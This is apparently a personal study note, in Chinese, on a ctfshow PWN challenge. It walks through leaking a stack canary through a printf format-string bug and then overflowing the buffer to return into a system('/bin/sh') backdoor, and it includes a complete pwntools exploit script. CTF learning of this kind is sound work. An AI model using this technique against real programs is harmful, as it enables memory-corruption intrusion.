@@ -1,0 +1,144 @@
+---
+tags:
+  - CTF
+  - ctfshow
+  - PWN
+  - 题目
+---
+## 题目描述
+
+```cpp
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  puts("Hello Hacker!");
+  vuln();
+  return 0;
+}
+```
+
+
+```cpp
+unsigned int vuln()
+{
+  int i; // [esp+4h] [ebp-74h]
+  char buf[100]; // [esp+8h] [ebp-70h] BYREF
+  unsigned int v3; // [esp+6Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  for ( i = 0; i <= 1; ++i )
+  {
+    read(0, buf, 0x200u);
+    printf(buf);
+  }
+  return __readgsdword(0x14u) ^ v3;
+}
+```
+
+有一个后门函数
+```cpp
+unsigned int getshell()
+{
+  unsigned int v1; // [esp+Ch] [ebp-Ch]
+
+  v1 = __readgsdword(0x14u);
+  system("/bin/sh");
+  return __readgsdword(0x14u) ^ v1;
+}
+```
+
+```bash
+nullsky@Shader:/mnt/d/WorkSpaces/temp$ pwn checksec ex2
+[*] '/mnt/d/WorkSpaces/temp/ex2'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+有 Canary ，是 `v3`
+
+## 过程
+
+> [!fail] 尝试1
+> 有 Canary 阻止我连续覆写到栈帧外面的数据，能不能先覆写，后面再通过某种方式还原？
+
+经过我的查询， 在同一个线程中，Canary是相同的。
+但似乎一旦覆写了 Canary ，我修改的返回地址就不起作用了。
+
+
+
+> [!fail] 尝试2
+> 程序里面有 `printf` ，能利用他来打印出 Canary 吗？
+
+^b7e786
+
+虽然我们能控制 `buf` 的值，但是改变不了 `buf` 的地址啊。。。
+
+
+> [!check] 标答
+> 实际上[[#^b7e786|尝试2]]的思路是正确的，但我还没掌握格式化相关的漏洞。
+
+
+
+![[Pasted image 20260415103805.png]]
+
+`printf` 的定义是这样的
+
+```c
+int __cdecl printf(const char * __restrict__ _Format,...);
+```
+
+`printf` 本身的定义就是期望第一个参数是格式化字符串，而不是我们认为的直接输出字符串。
+`%p` 是读取参数本身，而不会进行寻址。 `%s` 会进行间接寻址，访问参数所表示的地址的内存。
+所以我们可以通过输入 `%p` 来搞出 Canary 的值，因为他会直接输出 Canary 本身。
+但这有一个问题，printf之前有非常多的栈操作，我们咋知道 Canary 在哪里？
+我们可以通过 `buf` 来进行定位，我们用很多的 `"%p.%p.%p"` ，如果找到了和我们的输入是相同的，说明我们找到了 `buf`。（注意， `buf` 是数组，它本身绝对不会直接被push到栈里）
+然后我们就可以用这个 `buf` 来定位 Canary
+
+- 你的 `buf` 位于 `ebp-0x70`。
+- 你的 `Canary` 位于 `ebp-0x0C`。
+- 它们之间的距离是 $0x70 - 0x0C = 0x64$（十进制 **100** 字节）。
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+context.arch = 'i386'
+context.os = 'linux'
+
+p = process(['./ex2'])
+# p = process(['gdbserver', '0.0.0.0:11451', './ex2'])
+# p = remote('pwn.challenge.ctf.show', 28284)
+
+# pause()
+
+p.recvuntil(b'Hello Hacker!\n')
+
+# payload = b"%p.%p.%p.%p.%p.%p.%p.%p.%p" 
+# 第六个是 buf
+payload = b"%31$p" 
+p.sendline(payload)
+
+canary = p32(int(p.recvuntil("\n"), 16))
+print(f"获得canary:{canary}")
+
+# pause()
+
+payload = flat([b"A"*100, canary, b"A"*12, 0x0804859B])
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+## 总结
+
+> [!NOTE] idea
+> 当内存中的数据混杂在一起，无法分辨目标值，但却可以通过输入控制某片内存。那么可以考虑以输入的数据为基准，定位目标值。
+
+- 可以直接通过ida看栈结构
+- `printf`第一个参数就是格式化字符串
